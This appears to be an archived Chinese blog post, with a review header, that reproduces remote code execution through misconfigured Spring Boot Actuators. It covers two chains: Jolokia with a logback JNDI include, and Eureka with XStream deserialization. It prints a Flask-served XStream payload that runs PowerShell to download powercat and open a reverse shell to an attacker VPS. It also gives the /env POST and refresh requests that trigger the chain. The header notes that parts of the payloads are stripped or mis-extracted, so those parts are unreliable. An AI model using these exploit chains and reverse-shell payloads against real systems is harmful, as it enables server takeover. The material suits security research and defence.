---
source: "MrWQ/vulnerability-paper"
product: "Spring Cloud/Jolokia及Eureka XStream"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot Actuators 配置不当导致 RCE 漏洞复现 - JF ' blog"
prerequisites: "来源所述条件，未列明部分仍待核：Eureka-client<1.8.7；Logback/JDK/XStream版本缺失，需可写env和refresh"
side_effects: "未执行；本文需注意的操作影响：Jolokia核心配置丢失；insertFromJNDI只剩env-entry-，无法还原JNDI地址/as属性；多服务端口和外部代码依赖不清；Flask绑定172.31.245.127:2333又回连2333；PowerShell远程下载第三方main脚本未固定，改EurekaURL无恢复"
source_status: "recorded"
source_url: "https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
id: "vw-15c33651319ddcf8e19712c2"
entity_id: "ve-15c33651319ddcf8e19712c2"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Eureka-client&lt;1.8.7；Logback/JDK/XStream版本缺失，需可写env和refresh

代码与实验材料：正文提供Logback与Eureka两条链；Eureka XStream XML必要class属性丢失，不能直接复现；Windows PowerShell载体仍有独立变体价值，需回原文恢复。仅静态全文审阅，未执行。

来源证据范围：JF原文、Veracode原研究和artsploit实验项目，较强

- **证据待核（1）**：端点组件归属与检测判据错误；依据：称starter-actuator负责refresh，实际需Cloud管理支持；3秒返回与缺依赖不存在必然联系。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（2）**：Jolokia核心配置丢失；依据：insertFromJNDI只剩env-entry-，无法还原JNDI地址/as属性。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（3）**：多服务端口和外部代码依赖不清；依据：Flask绑定172.31.245.127:2333又回连2333；PowerShell远程下载第三方main脚本未固定，改EurekaURL无恢复。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（4）**：XStream XML必要类型属性抽取丢失；依据：398为&lt;value&gt;&lt;dataHandler&gt;&lt;dataSource&gt;&lt;is&gt;&lt;cipher&gt;等无class标签，402对应显式Base64Data/XMLMessage$XmlDataSource/CipherInputStream/NullCipher等类型。。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot Actuators 配置不当导致 RCE 漏洞复现 - JF ' blog

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [jianfensec.com](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

日期: [2019-03-12](https://jianfensec.com/archives/2019/03 "20:16:20") 更新: 2020-04-08 分类: [漏洞复现](https://jianfensec.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

漏洞分析源地址：  
[https://www.veracode.com/blog/research/exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

关于 springboot 监控可以参考以下文章：  
[https://www.freebuf.com/news/193509.html](https://www.freebuf.com/news/193509.html)

测试环境，原作者提供的 github：  
[https://github.com/artsploit/actuator-testbed](https://github.com/artsploit/actuator-testbed)

复现过程：

#### [](#1-Remote-Code-Execution-via-‘-jolokia’ "1.Remote Code Execution via ‘/jolokia’")1.Remote Code Execution via ‘/jolokia’

前置条件：  
在 jolokia/list 目录检索存在 logback 组件, 则可以使用 jolokia 远程包含 logback.xml 配置文件，直接执行远程引用字节码：  
[http://127.0.0.1:9090/jolokia/list](http://127.0.0.1:9090/jolokia/list)  
![](https://jianfensec.com/images/2019/03/4140320665.png)

1）在 VPS 上创建 logback.xml，logback 中填写 jndi 服务，当调用时直接触发恶意 class。

```
<configuration>
  <insertFromJNDI env-entry- />
</configuration>
```

![](https://jianfensec.com/images/2019/03/1172285257.png)

2）创建反弹 shell 的恶意 class, 并监听端口 8081  
javac Exploit.java -> Exploit.class  
![](https://jianfensec.com/images/2019/03/3849118789.png)  
3）利用 marshalsec 创建 jndi server 地址指向恶意 class 监听的端口 8081：  
![](https://jianfensec.com/images/2019/03/1439155234.png)  
4）监听反弹 shell 端口：

4）访问 springboot 以下链接触发远程访问 VPS 地址 logback.xml：  
[http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS 地址: 8080!/logback.xml](http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS%E5%9C%B0%E5%9D%80:8080!/logback.xml)  
触发回显 2333 端口接收到主机 whomai 结果：  
![](https://jianfensec.com/images/2019/10/420084106.png)

#### [](#2-Config-modification-via-‘-env’ "2. Config modification via ‘/env’")2. Config modification via ‘/env’

当第一种找不到 logback 配置可以尝试修改 env 配置文件进行 xstream 反序列化  
前置条件：  
Eureka-Client <1.8.7（多见于 Spring Cloud Netflix）  
比如测试前台 json 报错泄露包名就是使用 netflix：  
![](https://jianfensec.com/images/2019/03/1695128671.png)  
需要以下 2 个包

```
spring-boot-starter-actuator（/refresh刷新配置需要）
spring-cloud-starter-netflix-eureka-client（功能依赖）
```

1）在 VPS 创建 xstream 文件，使用 flask 返回 application/xml 格式数据：

```
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ['GET', 'POST'])
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value>
      <dataHandler>
        <dataSource>
          <is>
            <cipher>
              <serviceIterator>
                <iter>
                  <iter/>
                  <next>
                    <command>
					<string>powershell</string>
                    <string>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</string>
                      <string>powercat -c [vps地址] -p 2333 -e cmd</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter>
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next>foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')
if __name__ == "__main__":
    app.run(host='172.31.245.127', port=2333)
```

2）启动服务：

```
python3 flask_xstream.py
```

3）写入配置：

```
POST /env HTTP/1.1
Host: 127.0.0.1:9090
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

eureka.client.serviceUrl.defaultZone=http://vps:2333/xstream
```

![](https://jianfensec.com/images/2019/03/134312817.png)

刷新触发 [POST]：  
**一般情况需要等待 3 秒会有响应包，如果立即返回可能是服务缺少 spring-boot-starter-actuator 扩展包无法刷新漏洞则无法利用。**  
![](https://jianfensec.com/images/2019/03/3068556996.png)  
获取反弹 shell：  
![](https://jianfensec.com/images/2019/03/3495674142.png)

### [](#安全措施可参考： "安全措施可参考：")安全措施可参考：

[https://xz.aliyun.com/t/2233](https://xz.aliyun.com/t/2233)

如无特殊说明，均为原创内容。转载请注明出处！

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
